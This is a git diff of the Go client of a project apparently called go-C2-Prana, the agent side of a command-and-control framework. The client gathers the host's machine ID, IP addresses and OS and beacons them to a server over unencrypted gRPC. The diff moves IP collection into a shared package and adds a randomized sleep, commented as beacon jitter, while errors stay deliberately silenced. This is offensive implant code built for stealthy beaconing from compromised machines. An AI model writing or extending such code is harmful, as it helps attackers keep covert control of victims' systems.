@@ -3,32 +3,17 @@ package main
 import (
 	"context"
 	"github.com/denisbrodbeck/machineid"
+	"github.dev/nireitdev/go-C2-Prana/common"
 	"github.dev/nireitdev/go-C2-Prana/proto"
 	"google.golang.org/grpc"
 	"google.golang.org/grpc/credentials/insecure"
 	"log"
-	"net"
+	"math/rand"
 	"runtime"
 	"time"
 )
 
-func getAddrs() string {
-	addr, err := net.InterfaceAddrs()
-	if err != nil {
-		return ""
-	}
-
-	ip := ""
-	for _, addr := range addr {
-		if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
-			// check if IPv4 or IPv6 is not nil
-			if ipnet.IP.To4() != nil || ipnet.IP.To16 != nil {
-				ip = ip + ";" + ipnet.IP.String()
-			}
-		}
-	}
-	return ip
-}
+const SLEEP_BEACON_SEG = 60
 
 func main() {
 	//Coneccion al server:
@@ -46,7 +31,7 @@ func main() {
 	if err != nil {
 		//log.Fatal(err)  //Silent!!
 	}
-	ips := getAddrs()
+	ips := common.GetAddrs()
 	os := runtime.GOOS
 
 	for {
@@ -60,7 +45,7 @@ func main() {
 		}
 
 		log.Println("Recibido:", resp.Result)
-		time.Sleep(60 * time.Second)
+		time.Sleep(time.Duration(rand.Intn(SLEEP_BEACON_SEG)) * time.Second) //simulate beacon sleep + % jitter
 	}
 
 }
